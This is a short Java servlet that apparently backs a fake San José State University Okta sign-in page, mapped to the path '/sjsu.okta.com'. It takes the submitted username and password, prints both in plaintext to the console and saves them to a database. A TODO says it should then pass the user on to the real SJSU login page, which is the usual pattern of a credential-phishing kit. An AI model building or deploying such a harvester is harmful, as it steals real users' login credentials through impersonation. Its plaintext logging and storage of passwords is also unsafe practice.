package com.example.demo;

import jakarta.servlet.RequestDispatcher;
import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;

import java.io.IOException;
import java.io.PrintWriter;
import java.sql.*;
import com.example.demo.DatabaseConnection;
import java.sql.SQLException;

@WebServlet("/sjsu.okta.com")
public class Servlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        //Retrieve login info
        String studentID = req.getParameter("username");
        String password = req.getParameter("password");

        System.out.println("studentID: " + studentID);
        System.out.println("password: " + password);

        Bean bean = new Bean(studentID, password);
        int validation = 0;
        try {
            validation = bean.store();
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }
        System.out.println("what's in the validation var? " + validation);

        if(validation != 0){
            // TODO Should send to actual sjsu login page
            PrintWriter pr = resp.getWriter();
            pr.write("going to sjsu page");
        }
        else {
            System.out.println("Redirecting to testing.jsp");
            req.getRequestDispatcher("testing.jsp").forward(req, resp);
        }
    }

    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.getRequestDispatcher("signin.jsp").forward(req, resp);
//        RequestDispatcher dispatcher = req.getRequestDispatcher("signin.jsp");
//        dispatcher.forward(req, resp);
    }
}
